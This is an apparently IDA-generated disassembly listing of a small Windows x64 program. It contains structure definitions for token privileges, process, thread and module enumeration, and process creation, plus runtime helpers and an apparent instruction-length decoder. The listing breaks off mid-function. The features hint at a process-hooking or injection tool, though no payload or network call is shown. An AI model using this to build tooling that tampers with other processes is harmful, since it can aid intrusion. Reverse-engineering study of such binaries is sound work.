
GUID struc ; (sizeof=0x10, align=0x4, copyof_2)
                        ; XREF: .rdata:0000000140009D14/r
Data1 dd ?
Data2 dw ?
Data3 dw ?
Data4 db 8 dup(?)
GUID ends


RUNTIME_FUNCTION struc ; (sizeof=0xC, mappedto_3)
                        ; XREF: .rdata:000000014000A1A0/r
                        ; .rdata:000000014000A1B4/r ...
FunctionStart dd ?      ; offset rva
FunctionEnd dd ?        ; offset rva pastend
UnwindInfo dd ?         ; offset rva
RUNTIME_FUNCTION ends


UNWIND_INFO_HDR struc ; (sizeof=0x4, mappedto_4)
                        ; XREF: .rdata:stru_14000A078/r
                        ; .rdata:stru_14000A088/r ...
Ver3_Flags db ?         ; base 16
PrologSize db ?         ; base 16
CntUnwindCodes db ?     ; base 16
FrReg_FrRegOff db ?     ; base 16
UNWIND_INFO_HDR ends


UNWIND_CODE struc ; (sizeof=0x2, mappedto_5)
                        ; XREF: .rdata:000000014000A07C/r
                        ; .rdata:000000014000A07E/r ...
PrologOff db ?          ; base 16
OpCode_OpInfo db ?      ; base 16
UNWIND_CODE ends


_ThrowInfo struc ; (sizeof=0x10, align=0x4, copyof_8)
                        ; XREF: .rdata:__TI2?AVbad_alloc@std@@/r
                        ; .rdata:__TI3?AVbad_array_new_length@std@@/r
attributes dd ?
pmfnUnwind dd ?
pForwardCompat dd ?
pCatchableTypeArray dd ?
_ThrowInfo ends


_RTL_CRITICAL_SECTION struc ; (sizeof=0x28, align=0x8, copyof_12)
                        ; XREF: .data:CriticalSection/r
DebugInfo dq ?          ; offset
LockCount dd ?
RecursionCount dd ?
OwningThread dq ?       ; offset
LockSemaphore dq ?      ; offset
SpinCount dq ?
_RTL_CRITICAL_SECTION ends


_SYSTEMTIME struc ; (sizeof=0x10, align=0x2, copyof_22)
                        ; XREF: sub_140001780/r
wYear dw ?
wMonth dw ?             ; XREF: sub_140001780+169/r
wDayOfWeek dw ?
wDay dw ?               ; XREF: sub_140001780+11C/r
wHour dw ?
wMinute dw ?
wSecond dw ?            ; XREF: sub_140001780+1B5/r
wMilliseconds dw ?
_SYSTEMTIME ends


IID struc ; (sizeof=0x10, align=0x4, copyof_23)
                        ; XREF: .rdata:riid/r .rdata:rclsid/r
Data1 dd ?
Data2 dw ?
Data3 dw ?
Data4 db 8 dup(?)
IID ends


VARIANTARG struc ; (sizeof=0x18, align=0x8, copyof_24)
                        ; XREF: sub_1400021C0/r
anonymous_0 tagVARIANT::$E93DC971A089CC95F6C875332324C1E7 ?
                        ; XREF: sub_1400021C0+297/w
                        ; sub_1400021C0+2AC/w ...
VARIANTARG ends


tagVARIANT::$E93DC971A089CC95F6C875332324C1E7 union ; (sizeof=0x18, align=0x8, copyof_27)
                        ; XREF: sub_1400021C0+297/w
                        ; sub_1400021C0+2AC/w ...
anonymous_0 tagVARIANT::$E93DC971A089CC95F6C875332324C1E7::$65D68C826D16CA47CF95571D7BFCD657 ?
decVal DECIMAL ?
tagVARIANT::$E93DC971A089CC95F6C875332324C1E7 ends


tagVARIANT::$E93DC971A089CC95F6C875332324C1E7::$65D68C826D16CA47CF95571D7BFCD657 struc ; (sizeof=0x18, align=0x8, copyof_28)
                        ; XREF: tagVARIANT::$E93DC971A089CC95F6C875332324C1E7/r
vt dw ?
wReserved1 dw ?
wReserved2 dw ?
wReserved3 dw ?
anonymous_0 tagVARIANT::$::$65D68C826D16CA47CF95571D7BFCD657::$E09503A454170B491AC1C4312CE36FE6 ?
tagVARIANT::$E93DC971A089CC95F6C875332324C1E7::$65D68C826D16CA47CF95571D7BFCD657 ends


tagVARIANT::$::$65D68C826D16CA47CF95571D7BFCD657::$E09503A454170B491AC1C4312CE36FE6 union ; (sizeof=0x10, align=0x8, copyof_30)
                        ; XREF: tagVARIANT::$E93DC971A089CC95F6C875332324C1E7::$65D68C826D16CA47CF95571D7BFCD657/r
llVal dq ?
lVal dd ?
bVal db ?
iVal dw ?
fltVal dd ?
dblVal dq ?
boolVal dw ?
scode dd ?
cyVal CY ?
date dq ?
bstrVal dq ?            ; offset
punkVal dq ?            ; offset
pdispVal dq ?           ; offset
parray dq ?             ; offset
pbVal dq ?              ; offset
piVal dq ?              ; offset
plVal dq ?              ; offset
pllVal dq ?             ; offset
pfltVal dq ?            ; offset
pdblVal dq ?            ; offset
pboolVal dq ?           ; offset
pscode dq ?             ; offset
pcyVal dq ?             ; offset
pdate dq ?              ; offset
pbstrVal dq ?           ; offset
ppunkVal dq ?           ; offset
ppdispVal dq ?          ; offset
pparray dq ?            ; offset
pvarVal dq ?            ; offset
byref dq ?              ; offset
cVal db ?
uiVal dw ?
ulVal dd ?
ullVal dq ?
intVal dd ?
uintVal dd ?
pdecVal dq ?            ; offset
pcVal dq ?              ; offset
puiVal dq ?             ; offset
pulVal dq ?             ; offset
pullVal dq ?            ; offset
pintVal dq ?            ; offset
puintVal dq ?           ; offset
anonymous_0 tagVARIANT::$::$::$E09503A454170B491AC1C4312CE36FE6::$0FDBD249F1AECD6A49409B6B82281578 ?
tagVARIANT::$::$65D68C826D16CA47CF95571D7BFCD657::$E09503A454170B491AC1C4312CE36FE6 ends


CY union ; (sizeof=0x8, align=0x8, copyof_38)
                        ; XREF: tagVARIANT::$::$65D68C826D16CA47CF95571D7BFCD657::$E09503A454170B491AC1C4312CE36FE6/r
anonymous_0 tagCY::$3EA7BC8C29B528C7CA1203FC489E132F ?
int64 dq ?
CY ends


tagCY::$3EA7BC8C29B528C7CA1203FC489E132F struc ; (sizeof=0x8, align=0x4, copyof_40)
                        ; XREF: CY/r
Lo dd ?
Hi dd ?
tagCY::$3EA7BC8C29B528C7CA1203FC489E132F ends


tagVARIANT::$::$::$E09503A454170B491AC1C4312CE36FE6::$0FDBD249F1AECD6A49409B6B82281578 struc ; (sizeof=0x10, align=0x8, copyof_122)
                        ; XREF: tagVARIANT::$::$65D68C826D16CA47CF95571D7BFCD657::$E09503A454170B491AC1C4312CE36FE6/r
pvRecord dq ?           ; offset
pRecInfo dq ?           ; offset
tagVARIANT::$::$::$E09503A454170B491AC1C4312CE36FE6::$0FDBD249F1AECD6A49409B6B82281578 ends


DECIMAL struc ; (sizeof=0x10, align=0x8, copyof_116)
                        ; XREF: tagVARIANT::$E93DC971A089CC95F6C875332324C1E7/r
wReserved dw ?
anonymous_0 tagDEC::$64EC678C49E7BE49873AFBFB7A849D34 ?
Hi32 dd ?
anonymous_1 tagDEC::$D28E26DEC3EC762C06C2AA9D0F7AC301 ?
DECIMAL ends


tagDEC::$64EC678C49E7BE49873AFBFB7A849D34 union ; (sizeof=0x2, align=0x2, copyof_118)
                        ; XREF: DECIMAL/r
anonymous_0 tagDEC::$64EC678C49E7BE49873AFBFB7A849D34::$7F8459940C2B08BD5D82B0F27239141B ?
signscale dw ?
tagDEC::$64EC678C49E7BE49873AFBFB7A849D34 ends


tagDEC::$64EC678C49E7BE49873AFBFB7A849D34::$7F8459940C2B08BD5D82B0F27239141B struc ; (sizeof=0x2, copyof_119)
                        ; XREF: tagDEC::$64EC678C49E7BE49873AFBFB7A849D34/r
scale db ?
sign db ?
tagDEC::$64EC678C49E7BE49873AFBFB7A849D34::$7F8459940C2B08BD5D82B0F27239141B ends


tagDEC::$D28E26DEC3EC762C06C2AA9D0F7AC301 union ; (sizeof=0x8, align=0x8, copyof_120)
                        ; XREF: DECIMAL/r
anonymous_0 tagDEC::$D28E26DEC3EC762C06C2AA9D0F7AC301::$674876891A86A76F12C10005982BCA56 ?
Lo64 dq ?
tagDEC::$D28E26DEC3EC762C06C2AA9D0F7AC301 ends


tagDEC::$D28E26DEC3EC762C06C2AA9D0F7AC301::$674876891A86A76F12C10005982BCA56 struc ; (sizeof=0x8, align=0x4, copyof_121)
                        ; XREF: tagDEC::$D28E26DEC3EC762C06C2AA9D0F7AC301/r
Lo32 dd ?
Mid32 dd ?
tagDEC::$D28E26DEC3EC762C06C2AA9D0F7AC301::$674876891A86A76F12C10005982BCA56 ends


_LUID struc ; (sizeof=0x8, align=0x4, copyof_126)
                        ; XREF: sub_140002DF0/r
LowPart dd ?            ; XREF: sub_140002DF0+1F/w
                        ; sub_140002DF0+62/r
HighPart dd ?
_LUID ends


_TOKEN_PRIVILEGES struc ; (sizeof=0x10, align=0x4, copyof_127)
                        ; XREF: sub_140002DF0/r
PrivilegeCount dd ?     ; XREF: sub_140002DF0+24/w
                        ; sub_140002DF0+83/w
Privileges LUID_AND_ATTRIBUTES ? ; XREF: sub_140002DF0+7E/w
                        ; sub_140002DF0+8B/w
_TOKEN_PRIVILEGES ends


LUID_AND_ATTRIBUTES struc ; (sizeof=0xC, align=0x4, copyof_128)
                        ; XREF: _TOKEN_PRIVILEGES/r
Luid LUID ?             ; XREF: sub_140002DF0+7E/w
Attributes dd ?         ; XREF: sub_140002DF0+8B/w
LUID_AND_ATTRIBUTES ends


LUID struc ; (sizeof=0x8, align=0x4, copyof_130)
                        ; XREF: LUID_AND_ATTRIBUTES/r
LowPart dd ?            ; XREF: sub_140002DF0+7E/w
HighPart dd ?
LUID ends


PROCESSENTRY32W struc ; (sizeof=0x238, align=0x8, copyof_131)
                        ; XREF: sub_140002EE0/r
                        ; sub_1400034A0/r ...
dwSize dd ?             ; XREF: sub_140002EE0+CE/w
                        ; sub_1400034A0+CD/w ...
cntUsage dd ?           ; XREF: sub_140002EE0+DD/o
                        ; sub_1400034A0+DC/o ...
th32ProcessID dd ?      ; XREF: sub_140002EE0:loc_140002FE0/r
                        ; sub_140002EE0+110/r ...
db ? ; undefined
db ? ; undefined
db ? ; undefined
db ? ; undefined
th32DefaultHeapID dq ?
th32ModuleID dd ?
cntThreads dd ?
th32ParentProcessID dd ?
pcPriClassBase dd ?
dwFlags dd ?
szExeFile dw 260 dup(?) ; XREF: sub_140002EE0+13C/o
                        ; sub_140002EE0+140/r ...
db ? ; undefined
db ? ; undefined
db ? ; undefined
db ? ; undefined
PROCESSENTRY32W ends


_STARTUPINFOW struc ; (sizeof=0x68, align=0x8, copyof_133)
                        ; XREF: sub_1400034A0/r
cb dd ?                 ; XREF: sub_1400034A0:loc_14000361C/w
db ? ; undefined
db ? ; undefined
db ? ; undefined
db ? ; undefined
lpReserved dq ?         ; XREF: sub_1400034A0+186/w ; offset
lpDesktop dq ?          ; offset
lpTitle dq ?            ; XREF: sub_1400034A0+18A/w ; offset
dwX dd ?
dwY dd ?
dwXSize dd ?            ; XREF: sub_1400034A0+18E/w
dwYSize dd ?
dwXCountChars dd ?
dwYCountChars dd ?
dwFillAttribute dd ?    ; XREF: sub_1400034A0+192/w
dwFlags dd ?
wShowWindow dw ?
cbReserved2 dw ?
db ? ; undefined
db ? ; undefined
db ? ; undefined
db ? ; undefined
lpReserved2 dq ?        ; XREF: sub_1400034A0+196/w ; offset
hStdInput dq ?          ; offset
hStdOutput dq ?         ; XREF: sub_1400034A0+19A/w ; offset
hStdError dq ?          ; offset
_STARTUPINFOW ends


_PROCESS_INFORMATION struc ; (sizeof=0x18, align=0x8, copyof_136)
                        ; XREF: sub_1400034A0/r
hProcess dq ?           ; XREF: sub_1400034A0+20B/r ; offset
hThread dq ?            ; XREF: sub_1400034A0+216/r ; offset
dwProcessId dd ?
dwThreadId dd ?
_PROCESS_INFORMATION ends


MODULEENTRY32W struc ; (sizeof=0x438, align=0x8, copyof_137)
                        ; XREF: sub_140003850/r
dwSize dd ?             ; XREF: sub_140003850+34E/w
                        ; sub_140003850+689/o ...
th32ModuleID dd ?       ; XREF: sub_140003850+360/o
th32ProcessID dd ?
GlblcntUsage dd ?
ProccntUsage dd ?
db ? ; undefined
db ? ; undefined
db ? ; undefined
db ? ; undefined
modBaseAddr dq ?        ; offset
modBaseSize dd ?
db ? ; undefined
db ? ; undefined
db ? ; undefined
db ? ; undefined
hModule dq ?            ; offset
szModule dw 256 dup(?)  ; XREF: sub_140003850+3B0/o
                        ; sub_140003850+3B7/r
szExePath dw 260 dup(?)
MODULEENTRY32W ends


THREADENTRY32 struc ; (sizeof=0x1C, align=0x4, copyof_142)
                        ; XREF: sub_140003850/r
dwSize dd ?             ; XREF: sub_140003850+509/w
                        ; sub_140003850+CB2/w ...
cntUsage dd ?           ; XREF: sub_140003850+516/w
th32ThreadID dd ?       ; XREF: sub_140003850+53C/r
th32OwnerProcessID dd ? ; XREF: sub_140003850+536/r
tpBasePri dd ?
tpDeltaPri dd ?         ; XREF: sub_140003850+51B/w
dwFlags dd ?            ; XREF: sub_140003850+CC0/w
                        ; sub_140003850+CE1/w ...
THREADENTRY32 ends


WNDCLASSEXW struc ; (sizeof=0x50, align=0x8, copyof_144)
                        ; XREF: sub_1400048B0/r
cbSize dd ?             ; XREF: sub_1400048B0+3BD/w
style dd ?
lpfnWndProc dq ?        ; XREF: sub_1400048B0+3E7/w ; offset
cbClsExtra dd ?         ; XREF: sub_1400048B0+3C6/w
cbWndExtra dd ?
hInstance dq ?          ; XREF: sub_1400048B0+3EC/w ; offset
hIcon dq ?              ; XREF: sub_1400048B0+3CE/w ; offset
hCursor dq ?            ; XREF: sub_1400048B0+3FE/w ; offset
hbrBackground dq ?      ; XREF: sub_1400048B0+3D6/w
                        ; sub_1400048B0+402/w ; offset
lpszMenuName dq ?       ; offset
lpszClassName dq ?      ; XREF: sub_1400048B0+3DB/w
                        ; sub_1400048B0+411/w ; offset
hIconSm dq ?            ; offset
WNDCLASSEXW ends


tagMSG struc ; (sizeof=0x30, align=0x8, copyof_160)
                        ; XREF: sub_1400048B0/r
hwnd dq ?               ; offset
message dd ?            ; XREF: sub_1400048B0+58E/r
db ? ; undefined
db ? ; undefined
db ? ; undefined
db ? ; undefined
wParam dq ?
lParam dq ?
time dd ?
pt POINT ?
db ? ; undefined
db ? ; undefined
db ? ; undefined
db ? ; undefined
tagMSG ends


POINT struc ; (sizeof=0x8, align=0x4, copyof_161)
                        ; XREF: tagMSG/r
x dd ?
y dd ?
POINT ends


_onexit_table_t struc ; (sizeof=0x18, align=0x8, copyof_163)
                        ; XREF: .data:Table/r
                        ; .data:stru_14000C4A0/r
_first dq ?             ; XREF: sub_1400066E0+53/w
                        ; sub_1400066E0+66/w ... ; offset
_last dq ?              ; offset
_end dq ?               ; XREF: sub_1400066E0+5B/w
                        ; sub_1400066E0+6E/w ; offset
_onexit_table_t ends


_FILETIME struc ; (sizeof=0x8, align=0x4, copyof_165)
                        ; XREF: sub_1400068C0/r
dwLowDateTime dd ?      ; XREF: sub_1400068C0+31/w
                        ; sub_1400068C0+40/r
dwHighDateTime dd ?
_FILETIME ends


LARGE_INTEGER union ; (sizeof=0x8, align=0x8, copyof_166)
                        ; XREF: sub_1400068C0+6F/r
                        ; sub_1400068C0/r
anonymous_0 _LARGE_INTEGER::$837407842DC9087486FDFA5FEB63B74E ?
u _LARGE_INTEGER::$837407842DC9087486FDFA5FEB63B74E ?
QuadPart dq ?
LARGE_INTEGER ends


_LARGE_INTEGER::$837407842DC9087486FDFA5FEB63B74E struc ; (sizeof=0x8, align=0x4, copyof_168)
                        ; XREF: LARGE_INTEGER/r
                        ; LARGE_INTEGER/r
LowPart dd ?
HighPart dd ?
_LARGE_INTEGER::$837407842DC9087486FDFA5FEB63B74E ends


C_SCOPE_TABLE struc ; (sizeof=0x10, mappedto_169)
                        ; XREF: .rdata:000000014000A6BC/r
                        ; .rdata:000000014000A6CC/r ...
Begin dd ?              ; offset rva
End dd ?                ; offset rva pastend
Handler dd ?            ; offset rva
Target dd ?             ; offset rva
C_SCOPE_TABLE ends


; enum __TI_flags, copyof_6, bitfield, width 4 bytes
TI_IsConst  = 1
TI_IsVolatile  = 2
TI_IsUnaligned  = 4
TI_IsPure  = 8
TI_IsWinRT  = 10h


; enum __CT_flags, copyof_7, bitfield, width 4 bytes
CT_IsSimpleType  = 1
CT_ByReferenceOnly  = 2
CT_HasVirtualBase  = 4
CT_IsWinRTHandle  = 8
CT_IsStdBadAlloc  = 10h ; XREF: .rdata:__CT??_R0?AVbad_alloc@std@@@8_1400011D0/s

;
; +-------------------------------------------------------------------------+
; |      This file was generated by The Interactive Disassembler (IDA)      |
; |           Copyright (c) 2022 Hex-Rays, <support@hex-rays.com>           |
; +-------------------------------------------------------------------------+
;
; Input SHA256 : B15791A5B61ABF9D29A58B6674F1CE3A6318EADD0C1D353CB69EDC2DA6C7195D
; Input MD5    : 090BEC3805EB1848E6792CD541852C5F
; Input CRC32  : 1C7F165C

; File Name   : E:\C++\xx\test\testyy\yy.exe
; Format      : Portable executable for AMD64 (PE)
; Imagebase   : 140000000
; Timestamp   : 6AD385EF (Sat Oct 17 14:27:59 2026)
; Section 1. (virtual address 00001000)
; Virtual size                  : 000063D8 (  25560.)
; Section size in file          : 00006400 (  25600.)
; Offset to raw data for section: 00000400
; Flags 60000020: Text Executable Readable
; Alignment     : default
; PDB File Name : C:\Users\y\source\repos\Project15\Project15\x64\Release\Project15.pdb

.686p
.mmx
.model flat


; Segment type: Pure code
; Segment permissions: Read/Execute
_text segment para public 'CODE' use64
assume cs:_text
;org 140001000h
assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing



sub_140001000 proc near
lea     rax, unk_14000C568
retn
sub_140001000 endp

align 10h



; __int64 __fastcall sub_140001010(wchar_t *Buffer, size_t BufferCount, wchar_t *Format)
sub_140001010 proc near

Locale= qword ptr -38h
ArgList= qword ptr -30h
arg_10= qword ptr  18h
arg_18= byte ptr  20h

mov     [rsp+arg_10], r8
mov     qword ptr [rsp+arg_18], r9
push    rbx
push    rbp
push    rsi
push    rdi
sub     rsp, 38h
mov     rsi, r8
lea     rbp, [rsp+58h+arg_18]
mov     rdi, rdx
mov     rbx, rcx
call    sub_140001000
mov     [rsp+58h+ArgList], rbp ; ArgList
mov     r9, rsi         ; Format
mov     r8, rdi         ; BufferCount
mov     [rsp+58h+Locale], 0 ; Locale
mov     rdx, rbx        ; Buffer
mov     rcx, [rax]      ; Options
call    cs:__stdio_common_vswprintf_s
test    eax, eax
mov     ecx, 0FFFFFFFFh
cmovs   eax, ecx
add     rsp, 38h
pop     rdi
pop     rsi
pop     rbp
pop     rbx
retn
sub_140001010 endp

algn_140001068:
align 10h



sub_140001070 proc near
push    rbx
sub     rsp, 20h
mov     rbx, rcx
mov     rax, rdx
lea     rcx, ??_7exception@std@@6B@ ; const std::exception::`vftable'
xorps   xmm0, xmm0
lea     rdx, [rbx+8]
mov     [rbx], rcx
lea     rcx, [rax+8]
movups  xmmword ptr [rdx], xmm0
call    cs:__std_exception_copy
mov     rax, rbx
add     rsp, 20h
pop     rbx
retn
sub_140001070 endp

algn_1400010A3:
align 10h



sub_1400010B0 proc near
mov     rdx, [rcx+8]
lea     rax, aUnknownExcepti ; "Unknown exception"
test    rdx, rdx
cmovnz  rax, rdx
retn
sub_1400010B0 endp

align 10h



; __int64 __fastcall sub_1400010D0(void *Block)
sub_1400010D0 proc near

arg_0= qword ptr  8

mov     [rsp+arg_0], rbx
push    rdi
sub     rsp, 20h
lea     rax, ??_7exception@std@@6B@ ; const std::exception::`vftable'
mov     rdi, rcx
mov     [rcx], rax
mov     ebx, edx
add     rcx, 8
call    cs:__std_exception_destroy
test    bl, 1
jz      short loc_140001105
mov     edx, 18h
mov     rcx, rdi        ; Block
call    j_j_free

loc_140001105:
mov     rbx, [rsp+28h+arg_0]
mov     rax, rdi
add     rsp, 20h
pop     rdi
retn
sub_1400010D0 endp

algn_140001113:
align 20h



sub_140001120 proc near
lea     rax, ??_7exception@std@@6B@ ; const std::exception::`vftable'
mov     [rcx], rax
add     rcx, 8
jmp     cs:__std_exception_destroy
sub_140001120 endp

align 20h



sub_140001140 proc near
lea     rax, aBadArrayNewLen ; "bad array new length"
mov     qword ptr [rcx+10h], 0
mov     [rcx+8], rax
lea     rax, ??_7bad_array_new_length@std@@6B@ ; const std::bad_array_new_length::`vftable'
mov     [rcx], rax
mov     rax, rcx
retn
sub_140001140 endp

align 10h


; Attributes: noreturn

sub_140001170 proc near

pExceptionObject= byte ptr -28h

sub     rsp, 48h
lea     rcx, [rsp+48h+pExceptionObject]
call    sub_140001140
lea     rdx, __TI3?AVbad_array_new_length@std@@ ; pThrowInfo
lea     rcx, [rsp+48h+pExceptionObject] ; pExceptionObject
call    _CxxThrowException
align 10h
sub_140001170 endp




sub_140001190 proc near
push    rbx
sub     rsp, 20h
mov     rbx, rcx
mov     rax, rdx
lea     rcx, ??_7exception@std@@6B@ ; const std::exception::`vftable'
xorps   xmm0, xmm0
lea     rdx, [rbx+8]
mov     [rbx], rcx
lea     rcx, [rax+8]
movups  xmmword ptr [rdx], xmm0
call    cs:__std_exception_copy
lea     rax, ??_7bad_array_new_length@std@@6B@ ; const std::bad_array_new_length::`vftable'
mov     [rbx], rax
mov     rax, rbx
add     rsp, 20h
pop     rbx
retn
sub_140001190 endp

algn_1400011CD:
align 10h



sub_1400011D0 proc near
push    rbx
sub     rsp, 20h
mov     rbx, rcx
mov     rax, rdx
lea     rcx, ??_7exception@std@@6B@ ; const std::exception::`vftable'
xorps   xmm0, xmm0
lea     rdx, [rbx+8]
mov     [rbx], rcx
lea     rcx, [rax+8]
movups  xmmword ptr [rdx], xmm0
call    cs:__std_exception_copy
lea     rax, ??_7bad_alloc@std@@6B@ ; const std::bad_alloc::`vftable'
mov     [rbx], rax
mov     rax, rbx
add     rsp, 20h
pop     rbx
retn
sub_1400011D0 endp

algn_14000120D:
align 10h


; Attributes: noreturn

sub_140001210 proc near
sub     rsp, 28h
lea     rcx, aStringTooLong ; "string too long"
call    cs:?_Xlength_error@std@@YAXPEBD@Z ; std::_Xlength_error(char const *)
db 0CCh
sub_140001210 endp

algn_140001222:
align 10h



sub_140001230 proc near

arg_0= qword ptr  8

mov     [rsp+arg_0], rbx
mov     rbx, rcx
mov     rax, rcx
xor     r10b, r10b
mov     r11, 3C0000000010101h
nop     dword ptr [rax+rax+00000000h]

loc_140001250:
movzx   edx, byte ptr [rax]
mov     r8, rax
lea     r9d, [rdx-2Eh]
cmp     r9b, 39h ; '9'
ja      short loc_140001266
bt      r11, r9
jb      short loc_140001287

loc_140001266:
cmp     dl, 0F0h
jz      short loc_140001287
lea     ecx, [rdx-0F2h]
cmp     cl, 1
jbe     short loc_140001287
cmp     dl, 26h ; '&'
jz      short loc_140001287
lea     ecx, [rdx-40h]
cmp     cl, 0Fh
ja      short loc_14000128C
movzx   r10d, dl

loc_140001287:
inc     rax
jmp     short loc_140001250

loc_14000128C:
cmp     dl, 0Fh
jnz     loc_140001413
movzx   r11d, byte ptr [rax+1]
lea     ecx, [r11+0C8h]
test    cl, 0FDh
jz      loc_14000138D
mov     ecx, r11d
add     rax, 2
add     ecx, 0FFFFFFFBh ; switch 182 cases
cmp     ecx, 0B5h
ja      short def_1400012DA ; jumptable 00000001400012DA default case, cases 6-10,12,13,15-127,144-185
lea     r9, cs:140000000h
movsxd  rcx, ecx
movzx   ecx, ds:(byte_1400015F4 - 140000000h)[r9+rcx]
mov     edx, ds:(jpt_1400012DA - 140000000h)[r9+rcx*4]
add     rdx, r9
jmp     rdx             ; switch jump

loc_1400012DC:          ; jumptable 00000001400012DA cases 128-143
lea     rax, [r8+6]
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

loc_1400012E9:          ; jumptable 00000001400012DA case 186
movzx   r10d, byte ptr [rax]
lea     rax, [r8+3]
movzx   edx, r10b
movzx   r9d, r10b
shr     dl, 6
and     r9b, 7
cmp     dl, 3
jz      loc_1400014EE
cmp     r9b, 4
jnz     loc_1400014D5
lea     rax, [r8+4]
cmp     r10b, 40h ; '@'
jnb     loc_1400014D5
movzx   ecx, byte ptr [r8+3]
and     cl, 7
cmp     cl, 5
jnz     loc_1400014D5
lea     rax, [r8+8]
jmp     loc_1400014D5

def_1400012DA:          ; jumptable 00000001400012DA default case, cases 6-10,12,13,15-127,144-185
movzx   r10d, byte ptr [rax]
lea     rax, [r8+3]
movzx   edx, r10b
movzx   r9d, r10b
shr     dl, 6
and     r9b, 7
cmp     dl, 3
jz      loc_1400015C9
cmp     r9b, 4
jnz     loc_1400015BB
lea     rax, [r8+4]
cmp     r10b, 40h ; '@'
jnb     loc_1400015BB
movzx   ecx, byte ptr [r8+3]
and     cl, 7
cmp     cl, 5
jnz     loc_1400015BB
lea     rax, [r8+8]
jmp     loc_1400015BB

loc_14000138D:
movzx   r10d, byte ptr [rax+3]
add     rax, 4
movzx   edx, r10b
movzx   r9d, r10b
shr     dl, 6
and     r9b, 7
mov     rcx, rax
cmp     dl, 3
jz      short loc_1400013EE
cmp     r9b, 4
jnz     short loc_1400013CC
lea     rax, [r8+5]
cmp     r10b, 40h ; '@'
jnb     short loc_1400013CC
movzx   ecx, byte ptr [rcx]
and     cl, 7
cmp     cl, 5
jnz     short loc_1400013CC
lea     rax, [r8+9]

loc_1400013CC:
cmp     dl, 1
jnz     short loc_1400013E9
xor     ecx, ecx
inc     rax
cmp     r11b, 3Ah ; ':'
setz    cl
add     rax, rcx
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

loc_1400013E9:
cmp     dl, 2
jz      short loc_1400013FA

loc_1400013EE:
cmp     r10b, 40h ; '@'
jnb     short loc_1400013FE
cmp     r9b, 5
jnz     short loc_1400013FE

loc_1400013FA:
add     rax, 4

loc_1400013FE:
xor     ecx, ecx
cmp     r11b, 3Ah ; ':'
setz    cl
add     rax, rcx
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

loc_140001413:
mov     ecx, edx
inc     rax
add     ecx, 0FFFFFFB0h ; switch 168 cases
cmp     ecx, 0A7h
ja      def_140001445   ; jumptable 0000000140001445 default case, cases 96-103,108-111,132-143,145-155,158,159,164-175,196,197,200,202,203,206-231,234,236-243,245
lea     r9, cs:140000000h
movsxd  rcx, ecx
movzx   ecx, ds:(byte_1400016D0 - 140000000h)[r9+rcx]
mov     edx, ds:(jpt_140001445 - 140000000h)[r9+rcx*4]
add     rdx, r9
jmp     rdx             ; switch jump

loc_140001447:          ; jumptable 0000000140001445 case 194
lea     rax, [r8+3]
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

loc_140001454:          ; jumptable 0000000140001445 cases 104,232,233
lea     rax, [r8+5]
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

loc_140001461:          ; jumptable 0000000140001445 cases 106,112-127,176-183,205,235
lea     rax, [r8+2]
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

loc_14000146E:          ; jumptable 0000000140001445 cases 184-191
test    r10b, 8
mov     eax, 5
mov     ecx, 9
cmovnz  eax, ecx
add     rax, r8
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

loc_14000148B:          ; jumptable 0000000140001445 cases 160-163
lea     rax, [r8+9]
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

loc_140001498:          ; jumptable 0000000140001445 cases 107,128,130,131,192,193,198,246
movzx   r10d, byte ptr [rax]
lea     rax, [r8+2]
movzx   r9d, r10b
movzx   edx, r10b
and     r9b, 7
shr     dl, 6
cmp     dl, 3
jz      short loc_1400014EE
cmp     r9b, 4
jnz     short loc_1400014D5
lea     rax, [r8+3]
cmp     r10b, 40h ; '@'
jnb     short loc_1400014D5
movzx   ecx, byte ptr [r8+2]
and     cl, 7
cmp     cl, 5
jnz     short loc_1400014D5
lea     rax, [r8+7]

loc_1400014D5:
cmp     dl, 1
jnz     short loc_1400014E9
inc     rax
inc     rax
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

loc_1400014E9:
cmp     dl, 2
jz      short loc_1400014FA

loc_1400014EE:
cmp     r10b, 40h ; '@'
jnb     short loc_1400014FE
cmp     r9b, 5
jnz     short loc_1400014FE

loc_1400014FA:
add     rax, 4

loc_1400014FE:
inc     rax
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

loc_14000150A:          ; jumptable 0000000140001445 cases 105,129,199,247
movzx   r10d, byte ptr [rax]
lea     rax, [r8+2]
movzx   r9d, r10b
movzx   edx, r10b
and     r9b, 7
shr     dl, 6
cmp     dl, 3
jz      short loc_140001561
cmp     r9b, 4
jnz     short loc_140001547
lea     rax, [r8+3]
cmp     r10b, 40h ; '@'
jnb     short loc_140001547
movzx   ecx, byte ptr [r8+2]
and     cl, 7
cmp     cl, 5
jnz     short loc_140001547
lea     rax, [r8+7]

loc_140001547:
cmp     dl, 1
jnz     short loc_14000155C
inc     rax
add     rax, 4
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

loc_14000155C:
cmp     dl, 2
jz      short loc_14000156D

loc_140001561:
cmp     r10b, 40h ; '@'
jnb     short loc_1400015D5
cmp     r9b, 5
jnz     short loc_1400015D5

loc_14000156D:
add     rax, 4
add     rax, 4
sub     rax, rbx
mov     rbx, [rsp+arg_0]
retn

def_140001445:          ; jumptable 0000000140001445 default case, cases 96-103,108-111,132-143,145-155,158,159,164-175,196,197,200,202,203,206-231,234,236-243,245
movzx   r10d, byte ptr [rax]
lea     rax, [r8+2]
movzx   edx, r10b
movzx   r9d, r10b
shr     dl, 6
and     r9b, 7
cmp     dl, 3
jz      short loc_1400015C9
cmp     r9b, 4
jnz     short loc_1400015BB
lea     rax, [r8+3]
cmp     r10b, 40h ; '@'
jnb     short loc_1400015BB
movzx   ecx, byte ptr [r8+2]
and     cl, 7
cmp     cl, 5
jnz     short loc_1400015BB
lea     rax, [r8+7]

loc_1400015BB:
cmp     dl, 1
jz      loc_1400014FE
cmp     dl, 2
jz      short loc_1400015D5

loc_1400015C9:
cmp     r10b, 40h ; '@'
jnb     short loc_1400015D9 ; jumptable 00000001400012DA cases 5,11,14
                        ; jumptable 0000000140001445 cases 80-95,144,156,157,195,201,204,244
cmp     r9b, 5
jnz     short loc_1400015D9 ; jumptable 00000001400012DA cases 5,11,14
